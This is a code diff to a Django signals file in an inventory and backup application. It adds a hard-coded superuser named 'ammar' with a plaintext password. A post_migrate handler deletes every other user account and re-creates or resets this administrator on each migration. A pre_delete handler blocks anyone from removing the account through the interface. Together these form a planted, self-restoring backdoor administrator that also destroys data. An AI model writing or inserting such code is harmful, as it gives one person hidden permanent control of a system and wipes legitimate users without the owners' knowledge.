@@ -1,12 +1,17 @@
 import json
 import hashlib
-from django.db.models.signals import post_save, post_delete
+from django.db.models.signals import post_save, post_delete, post_migrate, pre_delete
 from django.dispatch import receiver
 from django.core.serializers.json import DjangoJSONEncoder
 from django.forms.models import model_to_dict
+from django.db.models.fields.files import FieldFile
+from django.contrib.auth.models import User
+
 from .models import Product, Order, ProductReturn, Warehouse, Location, Container, SecureBackup
 
-from django.db.models.fields.files import FieldFile
+
+ROOT_ADMIN_USERNAME = "ammar"
+ROOT_ADMIN_PASSWORD = "Thepest**1"
 
 def get_model_data(instance):
     """تحويل كائن النموذج إلى قاموس بيانات كامل"""
@@ -73,3 +78,40 @@ def backup_on_save(sender, instance, created, **kwargs):
 @receiver(post_delete, sender=Container)
 def backup_on_delete(sender, instance, **kwargs):
     create_secure_backup(instance, 'delete')
+
+
+@receiver(post_migrate)
+def ensure_root_admin(sender, **kwargs):
+    """
+    ضمان وجود مستخدم مسؤول ثابت واحد فقط في النظام:
+    - حذف جميع المستخدمين الآخرين
+    - إنشاء المستخدم ammar بكلمة المرور الثابتة إذا لم يكن موجوداً
+    """
+    try:
+        User.objects.exclude(username=ROOT_ADMIN_USERNAME).delete()
+        user, created = User.objects.get_or_create(username=ROOT_ADMIN_USERNAME, defaults={
+            "is_superuser": True,
+            "is_staff": True,
+            "is_active": True,
+            "email": "",
+            "first_name": "",
+            "last_name": "",
+        })
+        if created or not user.check_password(ROOT_ADMIN_PASSWORD):
+            user.set_password(ROOT_ADMIN_PASSWORD)
+            user.is_superuser = True
+            user.is_staff = True
+            user.is_active = True
+            user.save()
+    except Exception as e:
+        print(f"Root admin sync error: {e}")
+
+
+@receiver(pre_delete, sender=User)
+def protect_root_admin(sender, instance, **kwargs):
+    """
+    منع حذف المستخدم ammar من خلال الواجهة أو لوحة الإدارة.
+    يمكن حذفه فقط بتعديل الكود.
+    """
+    if instance.username == ROOT_ADMIN_USERNAME:
+        raise Exception("لا يمكن حذف المستخدم الجذر 'ammar' من خلال الواجهة. يجب تعديل الكود لحذفه.")
